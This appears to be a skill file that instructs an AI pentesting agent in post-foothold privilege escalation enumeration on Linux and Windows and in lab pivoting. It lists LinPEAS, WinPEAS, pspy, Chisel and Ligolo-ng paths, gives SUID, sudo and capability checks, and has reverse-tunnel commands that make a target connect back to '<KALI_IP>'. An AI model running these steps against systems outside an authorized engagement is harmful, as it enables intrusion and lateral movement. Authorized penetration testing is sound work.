---
name: privesc-pivoting-transfer
description: Guide read-only post-foothold privilege escalation enumeration, exact PEASS/pspy binary paths, and authorized lab pivoting or file transfer setups. Use when privesc, sudo, SUID, capabilities, cron, linpeas, winpeas, pspy, ligolo, or chisel pivoting is needed.
category: privesc
triggers:
  ports: []
  services: [ssh, winrm]
  keywords: [privesc, privilege escalation, sudo, suid, capabilities, cron, pspy, linpeas, winpeas, pivot, tunnel, ligolo, chisel]
recommended_tools: [execute_command]
allowed_mode: read_only
---

# Post-Foothold PrivEsc Enum & Lab Pivoting

## Verified Local Tool & Binary Paths
- **LinPEAS**: `/usr/bin/linpeas` and `/usr/share/peass/linpeas/` (`linpeas.sh`, `linpeas_linux_amd64`)
- **WinPEAS**: `/usr/bin/winpeas` and `/usr/share/peass/winpeas/` (`winPEASany.exe`, `winPEASx64.exe`, `winPEAS.bat`)
- **pspy (process monitor)**: `/usr/bin/pspy` and `/usr/share/pspy/` (`pspy32`, `pspy32s`, `pspy64`, `pspy64s`)
- **Chisel**: `chisel` (`~/go/bin/`) and `/usr/share/chisel-common-binaries/`
- **Ligolo-ng**: `ligolo-proxy`, `ligolo-agent`, `ligolo-mp` (`/usr/bin/` and `/usr/share/ligolo-ng-common-binaries/`) — note binary names are `ligolo-proxy`/`ligolo-agent` (not `ligolo-ng`).
- **Relays / Shells**: `socat`, `/usr/bin/pwncat` (note `pwncat-cs` is absent).

## Step 1: Read-Only Linux PrivEsc Triage (Target Host)
- Quick baseline checks before uploading larger scripts:
  - `id; uname -a; cat /etc/os-release`
  - `sudo -l` (check `NOPASSWD`, `env_keep`, `LD_PRELOAD`)
  - `find / -perm -4000 -type f 2>/dev/null` (SUID binaries)
  - `getcap -r / 2>/dev/null` (Linux capabilities)
  - `ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null; systemctl list-timers --all`
  - `ss -tulnp` (internal localhost-only services like `3306`, `5000`, `6379`, `8080`)
- Unprivileged cron/process observation: run `/usr/share/pspy/pspy64 -pf -i 1000` or `/usr/share/peass/linpeas/linpeas.sh -q` (read-only enum).

## Step 2: Read-Only Windows PrivEsc Triage (Target Host)
- `whoami /all` (check `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, group memberships)
- `systeminfo` | `net user` | `net localgroup administrators`
- `cmdkey /list` | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- `wmic service get name,displayname,pathname,startmode | findstr /i "auto"`
- Run `/usr/share/peass/winpeas/winPEASx64.exe quiet servicesinfo userinfo` when deeper enum is authorized.

## Step 3: Authorized Lab File Transfer & Tunneling
- **Serve verified local tools read-only** from Kali (`cd /usr/share/peass/linpeas && python3 -m http.server 8000`).
- **Ligolo-ng pivot** (preferred for clean subnet routing in multi-host labs):
  - Kali: `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up` -> `ligolo-proxy -selfcert -laddr 0.0.0.0:11601`
  - Pivot host: `ligolo-agent -connect <KALI_IP>:11601 -ignore-cert`
- **Chisel SOCKS5 fallback**:
  - Kali: `chisel server -p 8001 --reverse` -> target connects with `chisel client <KALI_IP>:8001 R:socks` (use `/usr/share/chisel-common-binaries/`).
- **Port forward**: `socat TCP-LISTEN:8080,fork TCP:127.0.0.1:8080`.
- **Guardrail**: Ask before writing files to target disk or executing privilege-escalation actions that modify system state.
